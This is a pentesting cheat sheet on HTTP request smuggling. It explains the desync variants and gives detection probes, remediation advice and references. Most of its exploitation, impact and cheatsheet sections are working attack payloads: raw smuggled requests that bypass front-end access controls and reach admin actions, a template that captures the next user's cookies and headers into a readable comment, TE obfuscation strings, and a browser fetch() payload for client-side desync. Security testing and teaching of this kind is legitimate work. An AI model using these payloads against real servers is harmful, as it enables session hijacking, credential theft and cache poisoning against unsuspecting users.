# HTTP Request Smuggling (Desync)

Request smuggling abuses a disagreement between two HTTP processors (typically a front-end CDN/proxy and a back-end server) about where one request ends and the next begins. The attacker prepends a hidden "smuggled" request that the back-end attaches to the **next** user's request, enabling response queue poisoning, request hijacking, cache poisoning, credential theft, and bypass of front-end access controls. James Kettle's 2025 research ("HTTP/1.1 Must Die: the desync endgame") added the **0.CL / CL.0** parser-discrepancy variants and client-side desync, with real CVEs (e.g. Akamai **CVE-2025-32094**) and large bug-bounty payouts.

---

## The variants

| Variant | Front-end uses | Back-end uses | Idea |
|---------|----------------|---------------|------|
| **CL.TE** | Content-Length | Transfer-Encoding | FE forwards whole body; BE stops at chunk terminator, treats rest as new request |
| **TE.CL** | Transfer-Encoding | Content-Length | FE chunk-parses; BE reads CL bytes, leaving the rest |
| **TE.TE** | TE (one obfuscated) | TE | One side ignores an obfuscated `Transfer-Encoding` |
| **CL.0** | Content-Length | ignores CL (treats as 0) | BE thinks body is empty; smuggled bytes start next request |
| **0.CL** | ignores CL (0) | Content-Length | FE sees no body; BE consumes CL bytes from the *next* request (2025) |
| **Client-side desync (CSD)** | n/a | browser-triggerable | Victim's own browser sends the poison; no FE/BE disagreement needed |
| **H2.CL / H2.TE** | HTTP/2 downgrade | HTTP/1 | Header injection during h2→h1 downgrade |

---

## Detection

### Timing-based probe (safe, no real impact)

Use the **HTTP Request Smuggler** Burp extension's "Smuggle probe" / "HTTP Desync" scan. Manual CL.TE timing test:

```http
POST / HTTP/1.1
Host: TARGET
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```

A long delay (the back-end waits for more chunk data that never comes) suggests CL.TE. TE.CL timing:

```http
POST / HTTP/1.1
Host: TARGET
Transfer-Encoding: chunked
Content-Length: 6

0

X
```

> 2025 note: distinguish a *real* desync from harmless HTTP/1.1 pipelining/connection reuse — confirm by poisoning a *second, separate* connection or showing cross-user impact, not just a timing blip.

### TE obfuscation variants to try (TE.TE)

```
Transfer-Encoding: chunked
Transfer-Encoding : chunked          (space before colon)
Transfer-Encoding:\tchunked          (tab)
Transfer-Encoding: xchunked
Transfer-Encoding:  chunked
X: X[\n]Transfer-Encoding: chunked   (folded)
Transfer-Encoding\r\n: chunked
transfer-encoding: chunked           (case)
Transfer-Encoding: chunked, identity
```

---

## Exploitation

### CL.TE — smuggle a request prefix

```http
POST / HTTP/1.1
Host: TARGET
Content-Length: 35
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X: 
```

Front-end uses CL (forwards everything). Back-end sees `0\r\n\r\n` = end of request, then treats `GET /admin...` as the start of the next request — which gets prefixed onto the next user's request.

### TE.CL — smuggle with chunk sizing

```http
POST / HTTP/1.1
Host: TARGET
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

(`5c` = hex length of the smuggled block; the trailing `0\r\n\r\n` terminates the chunked body.)

### CL.0 — back-end ignores Content-Length

```http
POST /vulnerable-endpoint HTTP/1.1
Host: TARGET
Content-Length: 34
Connection: keep-alive

GET /admin/delete?user=carlos HTTP/1.1
```

The back-end treats the POST body as empty (CL.0) and parses the body as a brand-new request on the same connection. Effective against endpoints that ignore the body (static files, redirects).

### 0.CL (2025) — front-end ignores CL, back-end honors it

```http
POST / HTTP/1.1
Host: TARGET
Content-Length: 23

GET /404 HTTP/1.1
Foo: x
```

Front-end forwards as a complete bodyless request; the back-end (using CL) waits for / consumes 23 bytes from the **following** victim request, splicing it. The 0.CL class powered several 2025 CDN findings (Akamai CVE-2025-32094, Netlify, etc.).

### Client-side desync (browser-powered)

No FE/BE disagreement required — the victim's browser is the smuggling engine. A malicious page issues a `fetch()` whose body contains a second request; if the server has a CSD-vulnerable endpoint (often one that ignores the body), the poison lands on the victim's own connection:

```javascript
fetch('https://TARGET/', {
  method: 'POST',
  body: 'GET /security-questions HTTP/1.1\r\nFoo: bar',
  mode: 'no-cors', credentials: 'include'
});
// Second fetch on the reused connection gets the smuggled prefix -> capture victim response
```

---

## Impact / what to do once desynced

```text
- Bypass front-end access controls: smuggle GET /admin past the FE that blocks it.
- Capture other users' requests (steal session cookies, CSRF tokens, auth headers).
- Response queue poisoning: desync the connection so users get each other's responses.
- Web cache poisoning combined with smuggling -> persistent stored XSS.
- Reflected/stored XSS via smuggled headers; turn a "self-only" XSS into mass XSS.
- Request hijacking / credential harvesting via a smuggled storage endpoint.
```

Cookie / request capture pattern (smuggle a request that stores the victim's request to a place you can read):

```http
POST / HTTP/1.1
Host: TARGET
Content-Length: ...
Transfer-Encoding: chunked

0

POST /comment HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: 400

comment=
```

The trailing open `comment=` swallows the next victim's request (headers, cookies) into a comment you can later read.

---

## HTTP/2-specific

```text
- H2.CL / H2.TE: inject CRLF into h2 pseudo-headers / header values; on downgrade to h1
  they become real request boundaries.
  e.g. header value: "foo\r\nTransfer-Encoding: chunked"
- h2c smuggling (upgrade to cleartext h2) bypasses some FE proxies.
- Request splitting via h2 :path / header injection.
```

The robust fix (and 2025 recommendation) is **end-to-end HTTP/2** with no downgrade to HTTP/1.1.

---

## Tooling

| Tool | Use |
|------|-----|
| **HTTP Request Smuggler** (Burp ext, PortSwigger) | Detect CL.TE/TE.CL/CL.0/0.CL/CSD, build attacks |
| **Turbo Intruder** | Single-packet / precise byte control, race + smuggling |
| **Burp Repeater** ("Send group in sequence over single connection") | Manual confirm cross-request impact |
| **smuggler.py** | CLI desync detection |
| **h2csmuggler** | h2c upgrade smuggling |

```bash
python3 smuggler.py -u https://TARGET/
python3 h2csmuggler.py -x https://TARGET/ http://TARGET/admin
```

---

## Remediation

- Prefer **HTTP/2 end-to-end**; never downgrade h2→h1 at the proxy. (PortSwigger: "HTTP/1.1 must die.")
- Make front-end and back-end agree: reject ambiguous messages with both `Content-Length` and `Transfer-Encoding`; reject malformed/duplicated/obfuscated TE.
- Normalize requests at the front-end; disable connection reuse to the back-end where feasible, or use a single, strict HTTP parser.
- Front-end should reject requests it doesn't fully understand (default-deny on parser ambiguity).
- Keep CDN/proxy software patched (multiple 2025 CVEs).

---

## Cheatsheet

```text
# Detect (Burp HTTP Request Smuggler) or timing probe
CL.TE timing: TE:chunked + CL:4 + body "1\nA\nX"
# CL.TE smuggle
CL + TE:chunked ; body: 0\r\n\r\nGET /admin HTTP/1.1\r\nX:
# TE.CL smuggle
CL:4 + TE:chunked ; body: 5c\r\n<smuggled req>\r\n0\r\n\r\n
# CL.0 (BE ignores CL)
POST /static + CL + body: GET /admin/... HTTP/1.1
# 0.CL (FE ignores CL) — 2025
POST / + CL:23 + body: GET /404 HTTP/1.1\r\nFoo: x
# TE obfuscation
"Transfer-Encoding : chunked" | "\tchunked" | "xchunked" | dup TE headers
# Client-side desync
fetch('/',{method:'POST',body:'GET /x HTTP/1.1\r\nFoo: bar',mode:'no-cors',credentials:'include'})
```

---

## References

- PortSwigger — HTTP request smuggling: https://portswigger.net/web-security/request-smuggling
- PortSwigger Research — HTTP/1.1 must die: the desync endgame (2025): https://portswigger.net/research/http1-must-die
- PortSwigger — Browser-powered desync attacks: https://portswigger.net/research/browser-powered-desync-attacks
- PortSwigger — The Desync Delusion (2025): https://portswigger.net/blog/the-desync-delusion-are-you-really-protected-against-http-request-smuggling
- PayloadsAllTheThings — Request Smuggling: https://swisskyrepo.github.io/PayloadsAllTheThings/Request%20Smuggling/
- HackTricks — HTTP request smuggling: https://hacktricks.wiki/en/pentesting-web/http-request-smuggling/index.html
- HTTP Request Smuggler (Burp): https://github.com/PortSwigger/http-request-smuggler
- YesWeHack — Bug Bounty guide to HTTP request smuggling: https://www.yeswehack.com/learn-bug-bounty/http-request-smuggling-guide-vulnerabilities
- New smuggling attacks impacting CDNs (2025, CVE-2025-32094): https://www.securityweek.com/new-http-request-smuggling-attacks-impacted-cdns-major-orgs-millions-of-websites/
